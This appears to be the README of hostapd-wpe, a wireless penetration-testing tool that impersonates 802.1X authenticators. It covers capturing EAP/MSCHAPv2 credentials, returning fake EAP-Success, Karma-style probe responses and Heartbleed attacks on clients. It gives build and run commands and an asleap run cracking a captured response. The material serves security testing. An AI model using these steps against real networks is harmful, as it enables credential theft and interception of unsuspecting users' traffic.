# About

hostapd-wpe is the replacement for [FreeRADIUS-WPE](http://www.willhackforsushi.com/?page_id=37).

It implements IEEE 802.1x Authenticator and Authentication Server impersonation attacks to obtain client credentials, establish connectivity to the client, and launch other attacks where applicable. 

hostapd-wpe supports the following EAP types for impersonation:
1. EAP-FAST/MSCHAPv2 (Phase 0)
2. PEAP/MSCHAPv2
3. EAP-TTLS/MSCHAPv2
4. EAP-TTLS/MSCHAP
5. EAP-TTLS/CHAP
6. EAP-TTLS/PAP

Once impersonation is underway, hostapd-wpe will return an EAP-Success message so that the client believes they are connected to their legitimate authenticator.

For 802.11 clients, hostapd-wpe also implements Karma-style gratuitous probe responses. Inspiration for this was provided by [JoMo-Kun's patch](http://www.foofus.net/?page_id=115) for older versions of hostapd.

hostapd-wpe also implements CVE-2014-0160 (Heartbleed) attacks against vulnerable clients. Inspiration for this was provided by the [Cupid](https://github.com/lgrangeia/cupid) PoC.

hostapd-wpe logs all data to stdout and hostapd-wpe.log

# Quick Usage
Once hostapd-wpe.patch is applied, hostapd-wpe.conf will be created at /path/to/build/hostapd/hostapd-wpe.conf. See that file for more  information. Note that /path/to/build/hostapd/hostapd-wpe.eap_users will also be created, and hostapd-wpe is dependent on it. 

Basic usage is:

```
hostapd-wpe hostapd-wpe.conf 
```

Credentials will be displayed on the screen and stored in hostapd-wpe.log

Additional WPE command line options are:

```
-s  Return EAP-Success messages after credentials are harvested
-k  Gratuitous probe responses (Karma mode) 
-c  Attempt to exploit CVE-2014-0160 (Cupid mode)
```

# Building

## Dependencies

- pkg-config
- libssl 1.0
- libnl3 (and genl)
- sqlite3

## Debian-based distro

```
apt-get install libssl1.0-dev libnl-genl-3-dev libnl-3-dev pkg-config
``` 

### Ubuntu

```
apt-get install libssl-dev libnl-genl-3-dev libnl-3-dev pkg-config
```

## General

```
git clone https://github.com/aircrack-ng/hostapd-wpe
wget http://hostap.epitest.fi/releases/hostapd-2.6.tar.gz
tar -zxf hostapd-2.6.tar.gz
cd hostapd-2.6
patch -p1 < ../hostapd-wpe/hostapd-wpe.patch 
cd hostapd
```

Then:

```
make
make install
make wpe
```

# Creating certs

```
cd /etc/hostapd-wpe/certs
./bootstrap
make install
```

# Running

With all of that complete, you can run hostapd. The patch will create a new hostapd-wpe.conf, which you'll likely need to modify in order to make it work for your attack. Once ready just run

```
hostapd /etc/hostapd-wpe/hostapd-wpe.conf
```

Look in the output for the username/challenge/response. It'll be there and in a hostapd-wpe.log file in the directory you ran hostapd from for instance here are the EAP-FAST Phase 0 creds from stdout:

```
username: jdslfkjs
challenge: bc:87:6c:48:37:d3:92:6e
response: 2d:00:61:59:56:06:02:dd:35:4a:0f:99:c8:6b:e1:fb:a3:04:ca:82:40:92:7c:f0
```

and as always, we feed them into asleap to crack:

```
# asleap -C bc:87:6c:48:37:d3:92:6e -R 2d:00:61:59:56:06:02:dd:35:4a:0f:99:c8:6b:e1:fb:a3:04:ca:82:40:92:7c:f0 -W wordlist 
asleap 2.2 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com>
hash bytes:        b1ca
NT hash:           e614b958df9df49ec094b8730f0bb1ca
password:          bradtest
```

Alternatively MSCHAPv2 credentials are outputted in john the rippers NETNTLM format. 

## Troubleshooting

### OpenSSL: tls_global_ca_cert - Failed to load root certificates error:02001002:system library:fopen:No such file or directory

Certificates are not created. Follow the procedure above to create them

### nl80211 driver initialization failed.

One of the possible reasons is that other processes are using the interface. Running ```airmon-ng check kill``` fixes the issue (it will kill any network manager and network connection).

# EAP-Success

Certain EAP types do not require the server to authenticate itself, just to validate the client's submitted credentials. Since we're playing the authentication server, that means we can easily just return an EAP-Success message to the client regardless of what they send us. The client is happy because they've connected, but unfortunately are unaware that they are connected to an unapproved authenticator. 

At this point, the attacker can set up a dhcp server and give the client an IP and then do whatever they'd like (e.g. redirect dns, launch attacks, MiTM, etc..)

MSCHAPv2 protects against this by having the server prove knowledge of the password most supplicants adhere to this policy, but we return EAP-Success just in case. 

# Karma-Style Probes

This functionality simply waits for an client to send a directed probe, when it does, it assumes that SSID and responds to the client. Only applicable to 802.11 clients.

# A note on MSCHAPv2

Microsoft offers something called "Computer Based Authentication". When a computer joins a domain it is assigned a password. This password is stored on the system and in active directory. We can harvest the MSCHAPv2 response from these systems but its going to take a lifetime to crack. Unless you're just trying to solve for the hash, and not the actual password :)

One other thing to note, if the client returns all zeros, it isnt joined to a domain. 

# Testing Heartbleed

If you're running Ubuntu and want to test Heartbleed you'll need to downgrade to a vulnerable version of OpenSSL. That can be done by:

```
wget https://launchpad.net/~ubuntu-security/+archive/ubuntu/ppa/+build/5436465/+files/openssl_1.0.1-4ubuntu5.11_i386.deb
wget https://launchpad.net/~ubuntu-security/+archive/ubuntu/ppa/+build/5436465/+files/libssl-dev_1.0.1-4ubuntu5.11_i386.deb
wget https://launchpad.net/~ubuntu-security/+archive/ubuntu/ppa/+build/5436465/+files/libssl-doc_1.0.1-4ubuntu5.11_all.deb
wget https://launchpad.net/~ubuntu-security/+archive/ubuntu/ppa/+build/5436465/+files/libssl1.0.0_1.0.1-4ubuntu5.11_i386.deb
sudo dpkg -i libssl1.0.0_1.0.1-4ubuntu5.11_i386.deb 
sudo dpkg --install libssl1.0.0_1.0.1-4ubuntu5.11_i386.deb \
libssl-dev_1.0.1-4ubuntu5.11_i386.deb \
libssl-doc_1.0.1-4ubuntu5.11_all.deb \
openssl_1.0.1-4ubuntu5.11_i386.deb
```

Then use wpa_supplicant to connect to hostapd-wpe -c 
